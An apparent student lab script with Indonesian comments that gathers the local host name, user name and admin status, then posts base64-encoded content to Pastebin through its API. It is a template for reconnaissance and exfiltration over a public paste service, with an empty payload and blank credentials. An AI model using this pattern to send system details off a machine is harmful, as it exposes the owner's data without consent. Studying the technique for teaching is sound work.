# Wellson Leewando
# 2301877426
# LB07

import socket, getpass, os, base64, requests, ctypes

host_name = socket.gethostname()
user_name = getpass.getuser()
is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

print('Host name -> ' + host_name)
print('Username -> ' + user_name)
print('Curr privilege is admin -> ' + str(is_admin))

cred = {
    'api_dev_key': '', # masukkan api_dev_key yang telah diberikan oleh pastebin akun masing-masing
    'api_user_name': '', # masukkan username dari akun pastebin masing-masing
    'api_user_password': '' # masukkan password dari akun pastebin masing-masing
}

url = 'https://pastebin.com/api/api_login.php'
r = requests.post(url, data=cred)

key = r.text
data = {
    'api_dev_key': '', # masukkan api_dev_key yang telah diberikan oleh pastebin akun masing-masing
    'api_paste_code': base64.b64encode(b''), # isi message yang ingin dikirim terlebih dahulu untuk diencode
    'api_paste_name': '', # isi judul pastebin yang ingin dibuat
    'api_option': 'paste',
    'api_user_key' : key
}
url = 'https://pastebin.com/api/api_post.php'

r = requests.post(url, data=data)

print(r.text)